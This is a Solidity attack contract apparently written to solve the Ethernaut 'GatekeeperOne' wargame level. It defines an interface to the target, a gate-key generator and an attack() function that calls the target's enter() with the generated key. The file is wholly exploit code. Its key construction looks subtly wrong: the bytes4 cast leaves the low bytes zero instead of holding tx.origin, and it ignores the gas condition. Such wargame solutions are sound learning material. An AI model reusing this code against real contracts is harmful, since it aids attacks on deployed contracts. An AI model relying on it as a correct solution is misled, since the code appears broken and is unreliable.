// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

// Instance: 0xA443B68F55CF08BD9132E33062E6b3375F1c6DDE
interface GatekeeperOne{
    function enter(bytes8 gateKey) external returns (bool);
}

contract EthernautGatekeeperOne {
    address public _target;
    constructor(address target) {
        _target = target;
    }

    function generateGatekey() public view returns (bytes8) {
        return bytes4(abi.encode(bytes4("asdf"), bytes2(0), bytes2(uint16(uint160(tx.origin)))));
    }

    function attack() public {
        GatekeeperOne(_target).enter(generateGatekey());
    }
}